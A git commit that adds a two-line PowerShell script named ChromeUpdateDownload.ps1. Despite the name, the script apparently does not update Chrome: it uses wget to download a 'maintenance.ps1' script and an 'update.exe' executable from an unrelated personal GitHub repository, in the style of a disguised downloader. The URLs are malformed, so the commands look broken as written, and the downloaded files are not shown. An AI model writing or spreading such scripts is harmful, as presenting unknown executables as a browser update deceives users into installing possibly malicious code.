fb4b5fdb8aae0f1a3be5177fa88fa3efe7564569
vishnuskandha <81701749+vishnuskandha@users.noreply.github.com>
2025-02-17 00:02:05 +0530

    Add files via upload

---
+++ ChromeUpdateDownload.ps1
@@ -0,0 +1,2 @@
+wget '(https://github.com/vishnuskandha/special-barnacle/blob/main/maintenance.ps1)/maintenance.ps1' -OutFile maintenance.ps1
+wget '(https://github.com/vishnuskandha/special-barnacle/blob/main/update.exe)/update.exe' -OutFile update.exe
